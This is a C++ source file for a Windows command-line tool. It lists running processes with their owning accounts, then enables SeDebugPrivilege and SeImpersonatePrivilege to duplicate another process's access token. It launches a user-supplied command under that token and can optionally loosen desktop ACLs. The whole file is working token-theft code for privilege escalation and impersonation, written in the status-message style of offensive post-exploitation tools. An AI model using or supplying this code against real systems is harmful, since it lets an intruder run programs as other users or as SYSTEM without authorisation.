#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include "ACL_Change.h"




BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    wprintf(L"[+] Enabled %s\n", lpszPrivilege);
    return TRUE;
}

#include <wtsapi32.h>
#pragma comment(lib ,"Wtsapi32.lib")
#include <map>
#include <vector>
#include <algorithm>

bool Contains(const std::vector<std::string>& list, std::string Value)
{
    return std::find(list.begin(), list.end(), Value) != list.end();
}


int wmain(int argc, wchar_t* argv[])
{


    if (!wcscmp(argv[1], L"list")) {

        WTS_PROCESS_INFO* pWPIs = NULL;
        DWORD dwProcCount = 0;
        std::vector<std::string> FoundUsers;

        if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
        {
            //Go through all processes retrieved
            std::cout << "ProcessID" << "\t|\t" << "Username" << "\n";
            std::cout << "\n---------------------------------------------\n";
            for (DWORD i = 0; i < dwProcCount; i++)
            {
                DWORD dwNameSize = 0;
                DWORD dwDomainNameSize = 0;
                SID_NAME_USE snu;
                LookupAccountSidA(NULL, pWPIs[i].pUserSid, NULL, &dwNameSize, NULL, &dwDomainNameSize, &snu);

                LPSTR ppName1 = (LPSTR)LocalAlloc(LPTR, dwNameSize);

                LPSTR ppDomain1 = (LPSTR)LocalAlloc(LPTR, dwDomainNameSize);

                LookupAccountSidA(NULL, pWPIs[i].pUserSid, ppName1, &dwNameSize, ppDomain1, &dwDomainNameSize, &snu);

                
                std::string fullName;
                fullName.append(ppDomain1);
                fullName.append("\\");
                fullName.append(ppName1);

                

                if (!Contains(FoundUsers, fullName))
                    std::cout << "\t" << pWPIs[i].ProcessId << "\t|\t" << fullName << "\n";

                FoundUsers.push_back(fullName);

                
            }

        }

        return 0;
    }



    if (!wcscmp(argv[1], L"exec")) {
    
        HANDLE hToken;
        OpenProcessToken(HANDLE(-1), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        SetPrivilege(hToken, (LPCTSTR)L"SeImpersonatePrivilege", 1);
        SetPrivilege(hToken, (LPCTSTR)L"SeDebugPrivilege", 1);

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, _wtoi(argv[2]));
    if (!process) {
        printf("[-] Unable to open process - check PID");
        CloseHandle(process);
        return 2;
    }

    printf("[+] Opened Process Sucessufully!\n");

    HANDLE ProcessToken;
    ZeroMemory(&ProcessToken, sizeof(HANDLE));
    OpenProcessToken(process, TOKEN_DUPLICATE, &ProcessToken);
    if (!ProcessToken)
        return 2;


    printf("[+] Opened Process Token Sucessufully!\n");

    HANDLE duplicated_token;
    ZeroMemory(&duplicated_token, sizeof(HANDLE));
    DuplicateTokenEx(ProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_token);
    if (duplicated_token) {
    
        ImpersonateLoggedOnUser(duplicated_token);

        STARTUPINFO si = {};
        PROCESS_INFORMATION pi = {};


        if (argc >= 5) {
            if((wcscmp(argv[4], L"interactive")) == 0)
                ACL_Change::AdjustDesktop();

        }

           

         

        if(CreateProcessWithTokenW(duplicated_token, 0, NULL, (LPWSTR)argv[3], 0, 0, 0, &si, &pi))
            std::wcout << L"\n[+] Opend Process Sucessfully: " << argv[3]  <<L"\n";
        else 
            std::cout << "\n[-] Unable to CreateProcessWithTokenW: " << ACL_Change::GetLastErrorAsString() << "\n";


        return 0;
            
    
    }
    else {
    
        std::cout << "\n[-] Unable to duplicate token: " << ACL_Change::GetLastErrorAsString() << "\n";

        return 2;
    }



    }

    return 0;
}